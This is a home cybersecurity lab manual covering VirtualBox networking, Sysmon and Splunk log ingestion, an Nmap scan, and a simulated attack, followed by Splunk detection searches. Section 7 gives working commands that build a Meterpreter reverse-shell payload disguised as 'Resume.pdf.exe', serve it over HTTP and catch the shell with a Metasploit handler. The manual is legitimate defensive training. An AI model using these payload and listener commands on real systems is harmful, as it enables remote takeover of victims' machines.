🏠 Cybersecurity Home Lab Manual

This guide documents the full process of building and using a defensive + offensive home lab with VirtualBox, Kali Linux, Windows 10, Sysmon, and Splunk. The goal is to simulate real-world attack and detection workflows.

1. Lab Architecture

VirtualBox is used as the hypervisor.

Internal Network configured so VMs can talk to each other but not the internet.

Static IPs assigned:

Windows 10 VM → 192.168.20.10

Kali Linux VM → 192.168.20.11

Diagram
[ Kali Linux Attacker ] 192.168.20.11
        |
   (Internal Network)
        |
[ Windows 10 Victim + Splunk ] 192.168.20.10

2. Windows 10 VM Setup

Install Windows 10 ISO in VirtualBox.

Disable auto-boot from ISO after installation (to avoid reinstall each reboot).

Assign static IP:

IP: 192.168.20.10

Subnet: 255.255.255.0

Gateway: leave blank (no internet).

Install Splunk Enterprise (free):

Download on host → copy into VM.

Install to default path C:\Program Files\Splunk.

Start Splunk via browser: https://localhost:8000.

3. Sysmon Deployment

Download Sysmon from Microsoft Sysinternals on host → copy to Windows VM.

Install with config:

sysmon64.exe -i sysmonconfig.xml


(The XML defines what events Sysmon collects).

Verify logs:

Open Event Viewer → Applications and Services Logs → Microsoft → Windows → Sysmon → Operational.

4. Splunk Configuration for Logs

Create a new index in Splunk:

Settings → Indexes → endpoint.

Create a small Splunk inputs.conf app:

Path:

C:\Program Files\Splunk\etc\apps\TA-lab-win\local\inputs.conf


Content:

[WinEventLog://Microsoft-Windows-Sysmon/Operational]
disabled = 0
index = endpoint
renderXml = true

[WinEventLog://Security]
disabled = 0
index = endpoint

[WinEventLog://System]
disabled = 0
index = endpoint

[WinEventLog://Application]
disabled = 0
index = endpoint

[WinEventLog://Microsoft-Windows-PowerShell/Operational]
disabled = 0
index = endpoint

[WinEventLog://Microsoft-Windows-Windows Defender/Operational]
disabled = 0
index = endpoint


Restart Splunk service:

net stop splunkd
net start splunkd


Verify ingestion in Search:

index=endpoint | stats count by sourcetype

5. Kali Linux VM Setup

Install Kali Linux ISO in VirtualBox.

Assign static IP:

IP: 192.168.20.11.

Install tools (already preloaded in Kali):

nmap, msfvenom, metasploit-framework.

6. Reconnaissance (Attacker → Victim)

From Kali, scan Windows:

nmap -Pn -A 192.168.20.10


If RDP is enabled → you’ll see 3389/tcp open.

Other ports may be closed unless you expose them.

7. Exploitation with Metasploit

On Kali, generate payload:

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.20.11 LPORT=4444 -f exe -o Resume.pdf.exe


Host file for transfer:

python3 -m http.server 9999


On Windows VM, download file (simulate user action).

On Kali, start listener:

msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.20.11
set LPORT 4444
run

8. Detection in Splunk
Search 1: Network Connections (Sysmon Event ID 3)
index=endpoint sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=3 dest_ip=192.168.20.11


Shows Windows connecting back to Kali’s 4444 port.

Search 2: Process Creation (Sysmon Event ID 1)
index=endpoint sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1 Image="*Resume.pdf.exe"


Shows execution of the dropped malware.

Search 3: General endpoint visibility
index=endpoint | stats count by EventCode, Image, dest_ip, dest_port

9. Lab Outcomes

✅ You simulated a realistic attack chain:

Recon (Nmap)

Exploit (Meterpreter via MSFVenom)

Execution (malware run on Windows)

Detection (Sysmon + Splunk).

✅ You learned:

How to build internal network lab safely (no internet exposure).

How to integrate Sysmon with Splunk for monitoring.

How to detect attacker activity via Splunk searches.

10. Next Steps

Add Splunk App for Sysmon (offline install).

Try other payloads (PowerShell Empire, Cobalt Strike trial).

Add more logs: DNS, Firewall, Registry.

Write Splunk detections (correlation searches).

Expand: Linux server + ELK stack, pfSense firewall, SIEM correlation.